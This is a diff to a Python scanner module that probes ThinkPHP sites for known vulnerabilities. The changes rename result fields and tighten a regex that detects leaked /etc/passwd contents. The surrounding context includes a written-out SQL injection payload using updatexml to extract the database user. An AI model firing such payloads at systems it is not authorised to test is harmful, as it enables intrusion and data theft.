@@ -35,6 +35,7 @@ from lib.tool import check
 from lib.tool import head
 from thirdparty import requests
 from time import sleep
+import re
 
 class ThinkPHP():
     def __init__(self):
@@ -104,7 +105,7 @@ class ThinkPHP():
             }
         ]
 
-        # * 以下payload没有找到测试环境, 所以没写poc, 哪个好心人提供一下环境QAQ
+        # * 以下payload没有找到测试环境, 暂时没写poc
         self.thinkphp_5_options_sqlinject_payloads = [
             {
                 'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
@@ -194,7 +195,8 @@ class ThinkPHP():
                     'Payload': {
                         'Url': url,
                         'Path': path
-                    }
+                    },
+                    'Request': res
                 }
                 return results
 
@@ -244,7 +246,7 @@ class ThinkPHP():
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -300,7 +302,8 @@ class ThinkPHP():
                     'Payload': {
                         'Url': url,
                         'Path': path
-                    }
+                    },
+                    'Request': res
                 }
                 return results
 
@@ -400,7 +403,7 @@ class ThinkPHP():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            if (('root:x:0:0:root' in res.text) 
+            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                 or (self.md in check.check_res(res.text, self.md))
                 or (('PHP Version' in res.text) 
                     and ('PHP License' in res.text))
@@ -408,7 +411,7 @@ class ThinkPHP():
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
